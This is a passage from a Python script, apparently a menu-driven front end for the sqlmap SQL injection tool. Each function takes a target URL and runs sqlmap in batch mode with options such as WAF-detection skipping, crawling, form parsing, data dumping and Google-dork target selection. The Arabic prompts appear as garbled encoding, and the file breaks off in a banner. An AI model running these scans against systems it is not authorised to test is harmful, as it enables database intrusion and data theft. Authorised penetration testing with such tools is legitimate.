# ╪к╪╣┘К┘К┘Ж ╪е╪м╪з╪и╪з╪к ┘Е╪│╪и┘В╪й
def set_answers():
    try:
        answers = i('╪г╪п╪о┘Д ╪з┘Д╪е╪м╪з╪и╪з╪к ╪з┘Д┘Е┘П╪│╪и┘В╪й (┘Е╪л╪з┘Д: "quit=N,follow=N"): ')
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--answers={answers}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪з┘Д╪е╪м╪з╪и╪з╪к ╪з┘Д┘Е╪│╪и┘В╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ╪и╪▒╪з┘Е┘К╪к╪▒╪з╪к ╪к╪н╪к┘И┘К ╪╣┘Д┘Й ╪и┘К╪з┘Ж╪з╪к Base64
def set_base64_params():
    try:
        params = i("╪г╪п╪о┘Д ╪з┘Д╪и╪▒╪з┘Е┘К╪к╪▒╪з╪к ╪з┘Д╪к┘К ╪к╪н╪к┘И┘К ╪╣┘Д┘Й ╪и┘К╪з┘Ж╪з╪к Base64 (┘Е╪л╪з┘Д: 'param1,param2'): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--base64={params}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪и╪▒╪з┘Е┘К╪к╪▒╪з╪к Base64.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪г╪и╪м╪п┘К╪й Base64 ╪з┘Д╪в┘Е┘Ж╪й URL ┘И╪з╪│┘Е ╪з┘Д┘Е┘Д┘Б
def use_base64_safe():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--base64-safe", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪о╪п╪з┘Е ╪г╪и╪м╪п┘К╪й Base64 ╪з┘Д╪в┘Е┘Ж╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к┘Б╪╣┘К┘Д ┘И╪╢╪╣ batch (╪╣╪п┘Е ╪╖┘Д╪и ┘Е╪п╪о┘Д╪з╪к ╪з┘Д┘Е╪│╪к╪о╪п┘Е)
def batch_mode():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д ┘И╪╢╪╣ batch.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ╪з┘Д╪н┘В┘И┘Д ╪з┘Д╪л┘Ж╪з╪ж┘К╪й (binary fields)
def set_binary_fields():
    try:
        fields = i("╪г╪п╪о┘Д ╪г╪│┘Е╪з╪б ╪з┘Д╪н┘В┘И┘Д ┘Д╪к┘Г┘И┘Ж ╪и┘Ж┘Е╪╖ ╪л┘Ж╪з╪ж┘К (┘Е╪л╪з┘Д: digest): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--binary-fields={fields}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪з┘Д╪н┘В┘И┘Д ╪з┘Д╪л┘Ж╪з╪ж┘К╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ┘Б╪н╪╡ ╪з╪к╪╡╪з┘Д ╪з┘Д╪е┘Ж╪к╪▒┘Ж╪к ┘В╪и┘Д ╪з┘Д╪к┘В┘К┘К┘Е
def check_internet_connection():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--check-internet", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ┘Б╪н╪╡ ╪з┘Д╪з╪к╪╡╪з┘Д ╪и╪з┘Д╪е┘Ж╪к╪▒┘Ж╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к┘Ж╪╕┘К┘Б ┘В┘И╪з╪╣╪п ╪и┘К╪з┘Ж╪з╪к sqlmap ┘Е┘Ж UDF ┘И╪з┘Д╪м╪п╪з┘И┘Д ╪з┘Д╪о╪з╪╡╪й
def cleanup_sqlmap():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--cleanup", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Ж╪╕┘К┘Б sqlmap.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з┘Д╪▓╪н┘Б ╪╣┘Д┘Й ╪з┘Д┘Е┘И┘В╪╣ ╪н╪к┘Й ╪╣┘Е┘В ┘Е╪н╪п╪п
def crawl_site():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        depth = i("╪г╪п╪о┘Д ╪╣┘Е┘В ╪з┘Д╪▓╪н┘Б (╪▒┘В┘Е): ")
        cmd = ["sqlmap", "-u", target_url, f"--crawl={depth}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪▓╪н┘Б ╪╣┘Д┘Й ╪з┘Д┘Е┘И┘В╪╣.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪л┘Ж╪з╪б ╪╡┘Б╪н╪з╪к ┘Е┘Ж ╪з┘Д╪▓╪н┘Б
def crawl_exclude_pages():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        exclude = i("╪г╪п╪о┘Д ╪к╪╣╪и┘К╪▒ ╪з╪│╪к╪л┘Ж╪з╪б ╪з┘Д╪╡┘Б╪н╪з╪к ┘Е┘Ж ╪з┘Д╪▓╪н┘Б (┘Е╪л╪з┘Д: logout): ")
        cmd = ["sqlmap", "-u", target_url, f"--crawl-exclude={exclude}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪л┘Ж╪з╪б ╪╡┘Б╪н╪з╪к ┘Е┘Ж ╪з┘Д╪▓╪н┘Б.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ┘Е╪н╪п╪п CSV ┘Д┘Д┘Б╪╡┘Д
def set_csv_delimiter():
    try:
        delimiter = i("╪г╪п╪о┘Д ┘Е╪н╪п╪п CSV (╪з┘Б╪к╪▒╪з╪╢┘К ','): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--csv-del={delimiter}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ┘Е╪н╪п╪п CSV.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж charset ┘Д┘Д╪з╪о╪к╪и╪з╪▒ ╪з┘Д╪╣┘Е┘К╪з╪б Blind SQLi
def set_charset():
    try:
        charset = i("╪г╪п╪о┘Д ┘Е╪м┘Е┘И╪╣╪й ╪з┘Д╪г╪н╪▒┘Б ┘Д┘Д╪з╪о╪к╪и╪з╪▒ ╪з┘Д╪╣┘Е┘К╪з╪б (┘Е╪л╪з┘Д: 0123456789abcdef): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--charset={charset}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж charset.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪╡┘К╪║╪й ╪к╪╡╪п┘К╪▒ ╪з┘Д╪и┘К╪з┘Ж╪з╪к (CSV, HTML, SQLITE)
def set_dump_format():
    try:
        dump_format = i("╪г╪п╪о┘Д ╪╡┘К╪║╪й ╪к╪╡╪п┘К╪▒ ╪з┘Д╪и┘К╪з┘Ж╪з╪к (CSV, HTML, SQLITE): ").upper()
        if dump_format not in ["CSV", "HTML", "SQLITE"]:
            p("тЪая╕П ╪╡┘К╪║╪й ╪║┘К╪▒ ┘Е╪п╪╣┘И┘Е╪й╪М ╪│┘К╪к┘Е ╪з╪│╪к╪о╪п╪з┘Е CSV ┘Г╪з┘Б╪к╪▒╪з╪╢┘К.")
            dump_format = "CSV"
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--dump-format={dump_format}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪╡┘К╪║╪й ╪к╪╡╪п┘К╪▒ ╪з┘Д╪и┘К╪з┘Ж╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ╪к╪▒┘Е┘К╪▓ ╪з┘Д╪г╪н╪▒┘Б (Encoding) ┘Д╪з╪│╪к╪▒╪м╪з╪╣ ╪з┘Д╪и┘К╪з┘Ж╪з╪к
def set_encoding():
    try:
        encoding = i("╪г╪п╪о┘Д ╪к╪▒┘Е┘К╪▓ ╪з┘Д╪г╪н╪▒┘Б (┘Е╪л╪з┘Д: GBK): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--encoding={encoding}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪з┘Д╪к╪▒┘Е┘К╪▓.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪╣╪▒╪╢ ETA (╪з┘Д┘И┘В╪к ╪з┘Д┘Е┘В╪п╪▒ ┘Д┘Д┘И╪╡┘И┘Д) ┘Д┘Г┘Д ┘Ж╪к┘К╪м╪й
def show_eta():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--eta", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╣╪▒╪╢ ETA.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к┘Б╪▒┘К╪║ ┘Е┘Д┘Б╪з╪к ╪з┘Д╪м┘Д╪│╪й ┘Д┘Д╪м┘З╪з╪▓ ╪з┘Д╪н╪з┘Д┘К
def flush_session_files():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--flush-session", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪▒┘К╪║ ┘Е┘Д┘Б╪з╪к ╪з┘Д╪м┘Д╪│╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ┘Б╪н╪╡ ┘И╪к╪н┘Д┘К┘Д ╪з┘Д┘Ж┘Е╪з╪░╪м (Forms) ┘Б┘К ╪з┘Д╪╡┘Б╪н╪й
def parse_forms():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--forms", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н┘Д┘К┘Д ╪з┘Д┘Ж┘Е╪з╪░╪м.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪м╪з┘З┘Д ┘Ж╪к╪з╪ж╪м ╪з┘Д╪з╪│╪к╪╣┘Д╪з┘Е╪з╪к ╪з┘Д┘Е╪о╪▓┘Ж╪й ┘Б┘К ╪з┘Д╪м┘Д╪│╪й
def ignore_fresh_queries():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--fresh-queries", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪м╪з┘З┘Д ╪з┘Д╪з╪│╪к╪╣┘Д╪з┘Е╪з╪к ╪з┘Д┘Е╪о╪▓┘Ж╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ┘Ж╪к╪з╪ж╪м Google dork ╪и╪п╪з┘К╪й ┘Е┘Ж ╪╡┘Б╪н╪й ┘Е╪╣┘К┘Ж╪й
def use_google_page():
    try:
        page = i("╪г╪п╪о┘Д ╪▒┘В┘Е ╪╡┘Б╪н╪й Google dork ┘Д┘Д╪и╪п╪б ┘Е┘Ж┘З╪з: ")
        cmd = ["sqlmap", f"--gpage={page}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪о╪п╪з┘Е ╪╡┘Б╪н╪й Google dork.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪│╪м┘К┘Д ╪н╪▒┘Г╪й HTTP ┘Б┘К ┘Е┘Д┘Б HAR
def log_har_file():
    try:
        har_file = i("╪г╪п╪о┘Д ╪з╪│┘Е ┘Е┘Д┘Б HAR ┘Д╪к╪│╪м┘К┘Д ╪н╪▒┘Г╪й HTTP: ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--har={har_file}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪│╪м┘К┘Д ┘Е┘Д┘Б HAR.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪к╪н┘И┘К┘Д hex ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪▒╪м╪з╪╣ ╪з┘Д╪и┘К╪з┘Ж╪з╪к
def use_hex():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--hex", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪о╪п╪з┘Е ╪к╪н┘И┘К┘Д hex.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ┘Е╪│╪з╪▒ ┘Е╪о╪▒╪м ┘Е╪о╪╡╪╡
def set_output_dir():
    try:
        output_dir = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е╪м┘Д╪п ╪з┘Д┘Е╪о╪▒╪м╪з╪к: ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--output-dir={output_dir}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ┘Е╪м┘Д╪п ╪з┘Д┘Е╪о╪▒╪м╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н┘Д┘К┘Д ╪▒╪│╪з╪ж┘Д ╪о╪╖╪г ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к ┘Е┘Ж ╪з┘Д╪▒╪п┘И╪п
def parse_db_errors():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--parse-errors", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н┘Д┘К┘Д ╪▒╪│╪з╪ж┘Д ╪з┘Д╪о╪╖╪г.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪│┘Г╪▒┘К╪и╪к╪з╪к ┘Е╪з ┘В╪и┘Д ╪з┘Д┘Е╪╣╪з┘Д╪м╪й (preprocessing)
def preprocess_script():
    try:
        scripts = i("╪г╪п╪о┘Д ╪г╪│┘Е╪з╪б ╪│┘Г╪▒┘К╪и╪к╪з╪к ╪з┘Д┘Е╪╣╪з┘Д╪м╪й ╪з┘Д┘Е╪│╪и┘В╪й (┘Е┘Б╪╡┘И┘Д╪й ╪и┘Б┘И╪з╪╡┘Д): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--preprocess={scripts}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪│┘Г╪▒┘К╪и╪к╪з╪к ╪з┘Д┘Е╪╣╪з┘Д╪м╪й ╪з┘Д┘Е╪│╪и┘В╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪│┘Г╪▒┘К╪и╪к╪з╪к ┘Е╪з ╪и╪╣╪п ╪з┘Д┘Е╪╣╪з┘Д╪м╪й (postprocessing)
def postprocess_script():
    try:
        scripts = i("╪г╪п╪о┘Д ╪г╪│┘Е╪з╪б ╪│┘Г╪▒┘К╪и╪к╪з╪к ╪з┘Д┘Е╪╣╪з┘Д╪м╪й ╪з┘Д┘Д╪з╪н┘В╪й (┘Е┘Б╪╡┘И┘Д╪й ╪и┘Б┘И╪з╪╡┘Д): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--postprocess={scripts}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪│┘Г╪▒┘К╪и╪к╪з╪к ╪з┘Д┘Е╪╣╪з┘Д╪м╪й ╪з┘Д┘Д╪з╪н┘В╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪е╪╣╪з╪п╪й ╪к┘Б╪▒┘К╪║ (redump) ╪з┘Д╪╡┘Б┘И┘Б ╪з┘Д╪к┘К ╪к╪н╪к┘И┘К ╪╣┘Д┘Й ╪╣┘Д╪з┘Е╪з╪к ╪║┘К╪▒ ┘Е╪╣╪▒┘И┘Б╪й
def repair_entries():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--repair", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╣╪з╪п╪й ╪к┘Б╪▒┘К╪║ ╪з┘Д╪╡┘Б┘И┘Б.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪н┘Б╪╕ ╪з┘Д╪о┘К╪з╪▒╪з╪к ┘Б┘К ┘Е┘Д┘Б INI
def save_config():
    try:
        save_file = i("╪г╪п╪о┘Д ╪з╪│┘Е ┘Е┘Д┘Б ╪н┘Б╪╕ ╪з┘Д╪е╪╣╪п╪з╪п╪з╪к (INI): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--save={save_file}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪н┘Б╪╕ ╪з┘Д╪е╪╣╪п╪з╪п╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ┘Ж╪╖╪з┘В ╪з┘Д┘З╪п┘Б (Regexp)
def set_scope():
    try:
        scope = i("╪г╪п╪о┘Д ╪к╪╣╪и┘К╪▒ ┘Ж╪╖╪з┘В ╪з┘Д┘З╪п┘Б (Regexp): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--scope={scope}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪з┘Д┘Ж╪╖╪з┘В.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪о╪╖┘К ╪з┘Д┘Г╪┤┘Б heuristics ╪╣┘Д┘Й ╪л╪║╪▒╪з╪к SQLi/XSS
def skip_heuristics():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--skip-heuristics", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪о╪╖┘К ╪з┘Д┘Г╪┤┘Б heuristics.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪о╪╖┘К ╪з┘Д┘Г╪┤┘Б heuristics ╪╣┘Д┘Й ╪н┘Е╪з┘К╪й WAF/IPS
def skip_waf():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--skip-waf", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪о╪╖┘К ╪з┘Д┘Г╪┤┘Б WAF.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ╪и╪з╪п╪ж╪й ┘Д┘Д╪м╪п╪з┘И┘Д ╪з┘Д┘Е╪д┘В╪к╪й
def set_table_prefix():
    try:
        prefix = i("╪г╪п╪о┘Д ╪и╪з╪п╪ж╪й ┘Д┘Д╪м╪п╪з┘И┘Д ╪з┘Д┘Е╪д┘В╪к╪й (╪з┘Б╪к╪▒╪з╪╢┘К sqlmap): ")
        if not prefix:
            prefix = "sqlmap"
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--table-prefix={prefix}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪и╪з╪п╪ж╪й ╪з┘Д╪м╪п╪з┘И┘Д.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪о╪к┘К╪з╪▒ ╪з╪о╪к╪и╪з╪▒╪з╪к ╪н╪│╪и payloads ┘И╪╣┘Ж╪з┘И┘К┘Ж┘З╪з
def set_test_filter():
    try:
        test_filter = i('╪г╪п╪о┘Д ╪к╪╡┘Б┘К╪й ╪з┘Д╪з╪о╪к╪и╪з╪▒╪з╪к (┘Е╪л╪з┘Д: "ROW"): ')
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--test-filter={test_filter}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪к╪╡┘Б┘К╪й ╪з┘Д╪з╪о╪к╪и╪з╪▒╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪о╪╖┘К ╪з╪о╪к╪и╪з╪▒╪з╪к ┘Е╪╣┘К┘Ж╪й ╪н╪│╪и payloads ┘И╪╣┘Ж╪з┘И┘К┘Ж┘З╪з
def set_test_skip():
    try:
        test_skip = i('╪г╪п╪о┘Д ╪з╪о╪к╪и╪з╪▒╪з╪к ┘Д┘Д╪к╪о╪╖┘К (┘Е╪л╪з┘Д: "BENCHMARK"): ')
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--test-skip={test_skip}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪з╪о╪к╪и╪з╪▒╪з╪к ┘Д┘Д╪к╪о╪╖┘К.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ╪м╪░╪▒ ┘И┘К╪и ╪з┘Д╪│┘К╪▒┘Б╪▒
def set_web_root():
    try:
        webroot = i('╪г╪п╪о┘Д ╪м╪░╪▒ ┘Е╪│╪к┘Ж╪п╪з╪к ╪з┘Д┘И┘К╪и ┘Д┘Д╪│┘К╪▒┘Б╪▒ (┘Е╪л╪з┘Д: "/var/www"): ')
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--web-root={webroot}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪м╪░╪▒ ╪з┘Д┘И┘К╪и.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def delay_print(text, delay=0.015):
    for c in text:
        print(c, end='', flush=True)
        time.sleep(delay)
    print()

def main_menu():
    while True:
        clear()
        p("""
тЦИтЦИтЦИ    тЦИтЦИ       тЦИтЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИ                                              
тЦИтЦИтЦИтЦИ   тЦИтЦИ       тЦИтЦИ      тЦИтЦИ    тЦИтЦИ тЦИтЦИ                                              
тЦИтЦИ тЦИтЦИ  тЦИтЦИ тЦИтЦИтЦИтЦИтЦИ тЦИтЦИтЦИтЦИтЦИтЦИтЦИ тЦИтЦИ    тЦИтЦИ тЦИтЦИ                                              
тЦИтЦИ  тЦИтЦИ тЦИтЦИ            тЦИтЦИ тЦИтЦИ тЦДтЦД тЦИтЦИ тЦИтЦИ                                              
тЦИтЦИ   тЦИтЦИтЦИтЦИ       тЦИтЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИтЦИтЦИтЦИтЦИ  тЦИтЦИтЦИтЦИтЦИтЦИтЦИ                                         
                            тЦАтЦА                                                   
                                                                                 
